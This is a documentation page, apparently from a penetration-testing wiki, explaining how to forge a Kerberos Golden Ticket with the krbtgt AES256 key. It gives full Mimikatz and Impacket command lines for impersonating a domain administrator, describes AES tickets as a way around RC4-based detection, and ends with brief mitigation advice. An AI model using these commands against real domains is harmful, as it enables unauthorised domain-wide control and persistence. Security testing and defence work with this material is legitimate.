---
title: "Golden Ticket"
sidebar_position: 2
---

You've dumped the `krbtgt` account credentials from a Domain Controller. You have its NTLM hash, but in a modern, secure Active Directory environment, that's only half the story. The true power lies in the stronger cryptographic keys derived from that password: the **AES keys**.

A **Golden Ticket** attack is the creation of a forged Kerberos Ticket-Granting Ticket (TGT). By forging it with the `krbtgt` account's secret keys, you can grant yourself administrative access to any resource, as any user, for as long as you desire. While the NTLM hash works for older encryption, using the AES key is the modern, preferred method that ensures your ticket is accepted in a hardened environment.

Think of it like this: The NTLM hash is the master key to the kingdom's old iron locks. The AES key is the master key for the new, high-security digital locks. To guarantee entry everywhere, you need the key for the modern locks.

---

## The "Why": Upgrading from NTLM to AES Keys

The `krbtgt` account's password hash is used to sign all Kerberos tickets. In older domains, this was done using the RC4-HMAC algorithm, which is based on the NTLM hash.

However, starting with Windows Server 2008, Active Directory introduced support for stronger **AES-256 and AES-128 encryption** for Kerberos. In any reasonably modern domain, the Domain Controllers will use and prefer tickets signed with these AES keys.

If you create a Golden Ticket signed only with the NTLM hash (RC4) and try to use it in an environment that expects AES, your request will likely be rejected. Therefore, a modern attacker **must use the `krbtgt` AES key** to create a fully-functional Golden Ticket.

---

## The Heist: Forging with Modern Cryptography

The prerequisites are the same, but your most important ingredient is now the **`krbtgt` AES256 key**, which you get when you dump the account's secrets.

1.  **The Domain Name:** e.g., `corp.local`
2.  **The Domain SID:** The Security Identifier of the domain.
3.  **The Target User:** The user you want to impersonate (usually `Administrator`).
4.  **The `krbtgt` AES256 Key:** The modern secret sauce.

Tools like `impacket-secretsdump` or `Mimikatz` will dump these keys for you right alongside the NTLM hash.

### **Using Mimikatz**

The command is nearly identical to before, but instead of `/krbtgt` (for the NTLM hash), you use `/aes256`.

```powershell
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-12345-67890-1234 /aes256:c899b82192534578160b3341434237a8549d532342342342342342342234 /ptt
```

* **/aes256:** You provide the AES256 key for the `krbtgt` account. This is now the preferred flag over `/krbtgt`.
* **/ptt:** "Pass the Ticket" immediately injects the newly forged, AES-strong ticket into your current session.

Your command prompt now operates with the full authority of a Domain Admin, and your Kerberos tickets will be cryptographically modern and accepted everywhere in the domain.

### **Using Impacket (`ticketer.py`)**

Similarly, with Impacket, you simply swap the hash flag for the key flag.

```bash
# 1. Create the ticket file using the AES key
ticketer.py -aesKey c899b82192534578160b3341434237a8549d532342342342342342342234 -domain-sid <SID> -domain <domain> Administrator

# 2. Set the KRB5CCNAME environment variable to point to the ticket
export KRB5CCNAME=Administrator.ccache

# 3. Use other tools like psexec.py, which will automatically use the ticket
psexec.py -k -no-pass -dc-ip <DC_IP> <domain>/Administrator

```

## How It Fits into Your Strategy: Modern Persistence

Using the AES key doesn't change the strategy; it perfects it.

 - **It's The Standard**: In any pentest against a post-2008 domain, using the AES key should be your default method for forging Golden Tickets.

 - **Bypasses Some Detections**: Security tools monitoring for weak RC4 Kerberos tickets (a common sign of an older-style Golden Ticket attack) will be bypassed when you use a ticket signed with AES.

 - **Guaranteed Access**: It ensures your ticket will be accepted by modern, patched Domain Controllers and services.

 ---

 ## Mitigation: The Defense is the Same

The good news for defenders is that the mitigation strategy doesn't change. Because the AES keys are derived directly from the `krbtgt` account's password, the same defense applies:

1. **Reset the `krbtgt` Account Password TWICE**. Resetting the password changes the underlying secret from which both the NTLM hash and the AES keys are generated. Doing it twice ensures that all old keys and tickets are invalidated throughout the domain's replication cycle.

2. **Protect Your Domain Controllers**. The best defense is to prevent an attacker from being able to dump the krbtgt secrets in the first place.

